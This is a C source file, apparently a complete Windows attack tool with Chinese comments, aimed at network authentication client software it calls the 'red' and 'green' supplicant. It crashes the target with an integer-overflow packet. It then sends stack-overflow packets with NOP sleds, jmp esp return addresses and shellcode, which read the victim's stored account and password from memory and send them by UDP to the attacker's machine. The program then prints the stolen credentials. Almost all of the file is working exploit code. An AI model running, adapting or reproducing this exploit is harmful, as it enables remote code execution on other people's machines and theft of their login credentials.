
#include <stdio.h>
#include <memory.h>
#include <string.h>

#include <windows.h>
#include <winsock.h>

#include "arp_ping.h"
#include "icmp_ping.h"
#include "md5.h"
#include "packet.h"

#pragma comment (lib,"ws2_32")

#pragma warning(disable:4786)
#pragma warning(disable:4309)
#pragma warning(disable:4305)

#define LOOP_TIME 300
#define MUTEX_NAME_SEND "BUFFER_ATTACK_SEND_BY_LCatro"
#define MUTEX_NAME_RECV "BUFFER_ATTACK_RECV_BY_LCatro"
#define GREEN_SUPPLICANT_WAIT_PASSWORD_PACKET_TIME 250000
#define RED_SUPPLICANT_WAIT_PASSWORD_PACKET_TIME 250000

typedef struct {
    char account[0x11];
    char password[0x11];
} account_password;

static void calcu_md5(const char* input_buffer,unsigned int input_buffer_length,char* output_buffer) {
    MD5_CTX md5;
    MD5Init(&md5);
    unsigned char decrypt[16]={0};
    MD5Update(&md5,(unsigned char*)input_buffer,input_buffer_length);
    MD5Final(&md5,decrypt);
    memcpy(output_buffer,&decrypt,16);
}

static signed int __cdecl packet_encode(char* a1, int a2)
{
  signed int result; // eax@2
  int i; // esi@5

  if ( a2 > 0 )
  {
    if ( a1 )
    {
      for ( i = 0; i < a2; ++i )
        *(char *)(i + a1) = 4 * (32 * *(char *)(i + a1) | *(char *)(i + a1) & 0x1C) | ((unsigned __int8)(*(char *)(i + a1) & 2 | ((unsigned __int8)(*(char *)(i + a1) & 0x20 | ((unsigned __int8)(*(char *)(i + a1) & 0x40 | (*(char *)(i + a1) >> 2) & 0x20) >> 2)) >> 1)) >> 1);
      result = 1;
    }
    else
    {
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}

static bool packet_decode(char* packet_buffer,long packet_length) {
  bool result; // eax@2
  int i; // esi@5

  if ( packet_length > 0 )
  {
    if ( packet_buffer )
    {
      for ( i = 0; i < packet_length; ++i )
        packet_buffer[i] = ((unsigned __int8)(((unsigned __int8)packet_buffer[i] >> 5) | packet_buffer[i] & 0x70) >> 2) | 2 * (packet_buffer[i] & 1 | 2 * (packet_buffer[i] & 8 | 4 * (packet_buffer[i] & 4 | 4 * (packet_buffer[i] & 0xFE))));
      result = 1;
    }
    else
    {
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}

static void send_packet_crash_red_supplicant(const char* targe_ip) {
    char buffer_crash[]={0x04,0x94,0x52,0xEA,0x47,0x45,0xA5,0x02,0x5E,0x6F,0x65,0x48,0x82,0x9B,0x18,0x18,0x02,0xBC,
                         0x08/* struct_key */,0xFF/*struct_length*/,
                         /* NOP  CODE*/0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90};

    packet_encode(buffer_crash,sizeof(buffer_crash));

    packet_send(targe_ip,buffer_crash,sizeof(buffer_crash));
}

static void send_packet_overflow_red_supplicant_for_old_version(const char* targe_ip) {
    char buffer_overflow[]={0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x25 /* struct_key */,0xB5 /*struct_length*/,
                            /* NOP  CODE 0x9B B WARNING! 只能理由后0x76 位,并且需要注意ESP */
                            /* NOP 炮灰代码 */0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
                            /* NOP 段可利用代码 */0xC6,0x44,0x24,0x10,0x41,0xC6,0x44,0x24,0x11,0x3A,0xC6,0x44,0x24,0x22,0x50,0xC6,0x44,0x24,0x23,0x3A,0xB9,0x04,0x00,0x00,0x00,0x8D,0x7C,0x24,0x12,0xBE,0xE8,0xB7,0x45,0x00,0xF3,0xA5,0xB9,0x04,0x00,0x00,0x00,0x8D,0x7C,0x24,0x24,0xBE,0x08,0xB8,0x45,0x00,0xF3,0xA5,0x8D,0x5C,0x24,0x10,0x8D,0x4D,0x1A,0x33,0xD2,0x66,0xBA,0x93,0x27,0x52,0x51,0xB8,0x24,0x00,0x00,0x00,0x50,0x53,0xA1,0x24,0x64,0x52,0x00,0x50,0xB8,0x40,0x8B,0x41,0x00,0xFF,0xD0,0xD0,0x6F,0x72,0x6C,0x64,0x21,0x00,0x54,0x45,0x53,0x54,0x00,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, /* 后四位不能使用,会自动变成0xFFFFFFFF */
                            /* RET  ADDR 0x04 B */0x9B,0xFC,0x44,0x00, // jmp esp  -  supplicant old version
												//0x73,0xF7,0x44,0x00, // jmp esp  -  supplicant new version
                            /*SHELL CODE 0x16 B */0x8B,0xEC,0x83,0xED,0x08,0x81,0xEC,0x00,0x01,0x00,0x00, /*mov ebp,esp;sub ebp,0x8;sub esp,0x100;*/
                                                  0x8B,0xC5,0x83,0xE8,0x76,0xFF,0xE0, /*mov eax,ebp;sub eax,0x76;jmp eax; */
                            /* 接收数据的IP 地址*/0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC};                                 
                                                 
/*
                Shell Code V1 :

                mov byte ptr [esp+0x10],41h;
                mov byte ptr [esp+0x11],3Ah;
                mov byte ptr [esp+0x22],50h;
                mov byte ptr [esp+0x23],3Ah;

                mov ecx,0x4;
                lea edi,byte ptr [esp+0x12];
                mov esi,0x45B7E8;  //  帐号
                rep movsd;

                mov ecx,0x4;
                lea edi,byte ptr [esp+0x24];
                mov esi,0x45B808;  //  密码
                rep movsd;

                lea ebx,byte ptr [esp+0x10];
                lea ecx,byte ptr [ebp+0x12];  //  IP Address
                xor edx,edx;
                mov dx,0x2793;  //  IP Port
                push edx;
                push ecx;
                mov eax,0x24;
                push eax;
                push ebx;
                mov eax,dword ptr [0x526424];  //  UDP Socket
                push eax;
                mov eax,0x418B40;  //  udp_send()
                call eax;

                Password Packet:
                A:_16B_P:_16B_
                |             |
            数据包开头    数据包结尾
*/
    *(unsigned char*)&buffer_overflow[0x01]=sizeof(buffer_overflow);
    memcpy(&buffer_overflow[0xB6],local_ip,strlen(local_ip)+1);

    calcu_md5(buffer_overflow,sizeof(buffer_overflow),&buffer_overflow[0x02]);
    packet_encode(buffer_overflow,sizeof(buffer_overflow));

    packet_send(targe_ip,buffer_overflow,sizeof(buffer_overflow));
}

static void send_packet_overflow_red_supplicant_for_new_version(const char* targe_ip) {
    char buffer_overflow[]={0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x25,0xB5,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC6,0x44,0x24,0x10,0x41,0xC6,0x44,0x24,0x11,0x3A,0xC6,0x44,0x24,0x22,0x50,0xC6,0x44,0x24,0x23,0x3A,0xB9,0x04,0x00,0x00,0x00,0x8D,0x7C,0x24,0x12,0xBE,0xE8,0xB7,0x45,0x00,0xF3,0xA5,0xB9,0x04,0x00,0x00,0x00,0x8D,0x7C,0x24,0x24,0xBE,0x08,0xB8,0x45,0x00,0xF3,0xA5,0x8D,0x5C,0x24,0x10,0x8D,0x4D,0x1A,0x33,0xD2,0x66,0xBA,0x93,0x27,0x52,0x51,0xB8,0x24,0x00,0x00,0x00,0x50,0x53,0xA1,0x24,0x64,0x52,0x00,0x50,0xB8,0x40,0x8B,0x41,0x00,0xFF,0xD0,0xD0,0x6F,0x72,0x6C,0x64,0x21,0x00,0x54,0x45,0x53,0x54,0x00,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, /* 后四位不能使用,会自动变成0xFFFFFFFF */0x73,0xF7,0x44,0x00,0x8B,0xEC,0x83,0xED,0x08,0x81,0xEC,0x00,0x01,0x00,0x00,0x8B,0xC5,0x83,0xE8,0x76,0xFF,0xE0,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC};                                 

    *(unsigned char*)&buffer_overflow[0x01]=sizeof(buffer_overflow);
    memcpy(&buffer_overflow[0xB6],local_ip,strlen(local_ip)+1);

    calcu_md5(buffer_overflow,sizeof(buffer_overflow),&buffer_overflow[0x02]);
    packet_encode(buffer_overflow,sizeof(buffer_overflow));

    packet_send(targe_ip,buffer_overflow,sizeof(buffer_overflow));
}

static bool get_password_for_red_supplicant(const char* targe_ip,account_password* output_information) {
    if (NULL==output_information) return false;

    send_packet_crash_red_supplicant(targe_ip);

    printf("Red Supplicant:Crash!\n");

    printf("\nRed Supplicant:Waitting Open Supplicant!\n");
/*
    bool port_open=false;
    DWORD old_tick=GetTickCount();
    DWORD new_tick=old_tick;
    do {
        port_open=sniffer_udp_port(targe_ip,SERVER_PORT);
        if (port_open)
            break;
    } while ((new_tick-old_tick)<=GREEN_SUPPLICANT_WAIT_PASSWORD_PACKET_TIME);
*/

    Sleep(5000);

//    if (port_open) {
        char recv_buffer[0x25]={0};
        int recv_length=0;
        for (unsigned long tick=0;tick<LOOP_TIME;++tick) {
            send_packet_overflow_red_supplicant_for_old_version(targe_ip);
            recv_length=packet_recv(recv_buffer);

            printf("Red Supplicant:Overflow %d!\n",tick);

            if (-1!=recv_length) {
                printf("Red Supplicant:Sniffer Success!\n");
                memset(output_information,0,sizeof(account_password));
                memcpy(output_information->account,&recv_buffer[0x02],0x10);
                memcpy(output_information->password,&recv_buffer[0x14],0x10);
                return true;
            }
        }
//    }
    return false;
}

static bool get_password_for_green_supplicant(const char* targe_ip,account_password* output_information) {
    if (NULL==output_information) return false;

    char buffer_shellcode[]={0x10,0xb8,0x3f,0x9d,0xd4,0xfc,0x5e,0xc4,0xa3,0x35,0x19,0x02,0xf5,0xbd,0x24,0x57,0x2d,0x10,0x81,0x81,0x80,0x20,0x40,0xc8,0xe8,0x49,0xc9,0xe8,0xe8,0xe8,0x59,0x68,0x48,0x59,0x68,0xd8,0xc8,0xd9,0x68,0x50,0x11,0x80,0x00,0x80,0xdd};

    packet_encode(buffer_shellcode,sizeof(buffer_shellcode));
    packet_send_recv(targe_ip,SUPPLICANT_SERVER_PORT,buffer_shellcode,sizeof(buffer_shellcode));

    printf("Green Supplicant:Send ShellCode!\n");
    printf("Green Supplicant:Listen Account and Password!\n");

    DWORD old_tick=GetTickCount();
    DWORD new_tick=old_tick;
    do {
        char recv_packet[PACKET_RECV_BUFFER]={0};
        unsigned int recv_length=packet_recv(recv_packet);

        if (-1!=recv_length) {
            packet_decode(recv_packet,recv_length);

            if (0x01==recv_packet[0]) {
                printf("Green Supplicant:Sniffer Success!\n");
                memset(output_information,0,sizeof(account_password));
                unsigned char account_length=recv_packet[0x1B];
                memcpy(output_information->account,&recv_packet[0x1C],account_length-2);
                unsigned char password_length=recv_packet[0x1C+account_length-1];
                memcpy(output_information->password,&recv_packet[0x1C+account_length],password_length-2);
                return true;
            } else
                printf("Green Supplicant:Tick Packet! %ds\n",(new_tick-old_tick)/1000);
            printf("%d:%s \n",(new_tick-old_tick)/1000,recv_packet);
        }
        new_tick=GetTickCount();
    } while ((new_tick-old_tick)<=GREEN_SUPPLICANT_WAIT_PASSWORD_PACKET_TIME);

    return false;
}

static bool is_green_supplicant(const char* targe_ip) {
	if (!sniffer_udp_port(targe_ip,RED_SUPPLICANT_PORT1) && !sniffer_udp_port(targe_ip,RED_SUPPLICANT_PORT2))
		return true;
	else
		return false;
}

int main(void) {
    packet_init();
	arp_ping_init();
	icmp_ping_init();

	/*

        由于不能直接利用整数溢出获取帐号,所以只能结合

        Packet 1: 0x04 --- 0x08 0xFF (整数溢出)
        Packet 2: 0x02 --- 0x25 0xFF (栈溢出)
    
    */

    char targe_ip[IPV4_LENGTH]={0};
    printf("input a attack ip:");
    scanf("%s",targe_ip);

    if (0xFFFFFFFF==inet_addr(targe_ip)) {
        printf("That is not a valid ip!");
        return 1;
    }

	if (icmp_ping(targe_ip))
		printf("Target living \n");
	else {
		printf("Target no living \n");
		return 1;
	}
/*
	if (!check_ip_subnet(targe_ip)) {
		printf("targe ip is dead!\n");
		return 1;
	}
*/
    account_password information={0};
    if (is_green_supplicant(targe_ip))
        if (get_password_for_green_supplicant(targe_ip,&information))
            printf("Get Password Success! Account:%s Password:%s \n",information.account,information.password);
        else
            printf("Get Password ERROR!\n");
    else
        if (get_password_for_red_supplicant(targe_ip,&information))
            printf("Get Password Success! Account:%s Password:%s \n",information.account,information.password);
        else
            printf("Get Password ERROR!\n");

	icmp_ping_clean();
	arp_ping_clean();
    packet_clean();
	return 0;
}
